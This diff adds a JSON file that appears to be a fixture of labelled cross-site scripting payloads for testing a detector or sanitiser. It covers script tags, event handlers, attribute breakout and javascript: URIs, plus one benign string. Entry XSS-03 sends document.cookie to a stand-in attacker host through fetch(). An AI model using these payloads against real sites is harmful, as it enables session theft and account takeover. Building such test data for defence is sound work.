@@ -1,0 +1,44 @@
+[
+    {
+        "id": "XSS-01",
+        "category": "Reflected / Classic Tag Injection",
+        "payload": "<script>alert(document.cookie)</script>",
+        "context": "html_body"
+    },
+    {
+        "id": "XSS-02",
+        "category": "Event Handler Injection",
+        "payload": "<img src=\"invalid.jpg\" onerror=\"alert('XSS')\" />",
+        "context": "html_body"
+    },
+    {
+        "id": "XSS-03",
+        "category": "SVG Vector Injection",
+        "payload": "<svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)>",
+        "context": "html_body"
+    },
+    {
+        "id": "XSS-04",
+        "category": "Attribute Breakout",
+        "payload": "\" onfocus=\"alert(document.domain)\" autofocus=\"",
+        "context": "attribute_value"
+    },
+    {
+        "id": "XSS-05",
+        "category": "JavaScript Pseudo-Protocol",
+        "payload": "<a href=\"javascript:alert('XSS')\">Click here to claim prize</a>",
+        "context": "uri_attribute"
+    },
+    {
+        "id": "XSS-06",
+        "category": "DOM-Based Nested Script Bypass",
+        "payload": "<iframe src=\"javascript:alert(window.origin)\"></iframe>",
+        "context": "dom_sink"
+    },
+    {
+        "id": "BENIGN-01",
+        "category": "Benign Text Input",
+        "payload": "Welcome to Sqrock IT Solutions Cybersecurity Internship Phase 2!",
+        "context": "html_body"
+    }
+]
